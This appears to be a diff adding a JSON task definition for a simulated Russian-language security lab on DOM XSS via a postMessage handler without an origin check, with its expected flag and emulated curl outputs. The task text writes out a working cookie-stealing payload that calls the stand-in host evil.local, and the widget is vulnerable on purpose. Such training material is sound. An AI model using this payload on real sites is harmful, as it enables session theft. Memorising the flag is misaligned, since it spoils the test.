@@ -1,0 +1,46 @@
+{
+  "id": "web-postmessage-tabnabbing",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{p0stm3ss4g3_n0_0r1g1n_ch3ck}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: DOM XSS через postMessage без проверки origin\n\nВиджет `victim.com/widget` слушает `message` и пишет `e.data` в `innerHTML`\n**без проверки `e.origin`** (см. `widget.js`).\n\n1. Прочитай обработчик:\n\n   cat widget.js\n\n2. Собери `exploit.html`: `iframe` на виджет и `postMessage` с payload,\n   который исполняет JS в контексте виджета:\n\n   echo '<iframe id=f src=\"https://victim.com/widget\"></iframe><script>f.onload=()=>f.contentWindow.postMessage(\"<img src=x onerror=fetch(\\'https://evil.local/?c=\\'+document.cookie)>\",\"*\")</script>' > exploit.html\n\n3. Payload читает `document.cookie` жертвы и шлёт его на `evil.local`. Забери\n   перехваченные данные:\n\n   curl -s 'https://evil.local/steal' > found.txt\n\n4. Набери `check` — он проверит и `exploit.html`, и утёкшие данные.\n"
+    },
+    {
+      "path": "/home/student/task/widget.js",
+      "text": "// widget.js — виджет чата на victim.com/widget\nwindow.addEventListener('message', (e) => {\n  // ОШИБКА: e.origin не проверяется вообще\n  document.getElementById('out').innerHTML = e.data;\n});\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция victim.com / evil.local)",
+      "cases": [
+        {
+          "match": "evil\\.local",
+          "example": "-s https://evil.local/steal",
+          "output": "[exfil] received from victim browser:\n  cookie: session=nto{p0stm3ss4g3_n0_0r1g1n_ch3ck}\n"
+        },
+        {
+          "match": "victim\\.com/widget",
+          "example": "-s https://victim.com/widget",
+          "output": "<div id=\"out\"></div>\n<script src=\"/widget.js\"></script>\n"
+        },
+        {
+          "match": "victim\\.com",
+          "example": "-s https://victim.com/",
+          "output": "<!doctype html><title>victim.com</title>\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется victim.com.\n"
+    }
+  }
+}
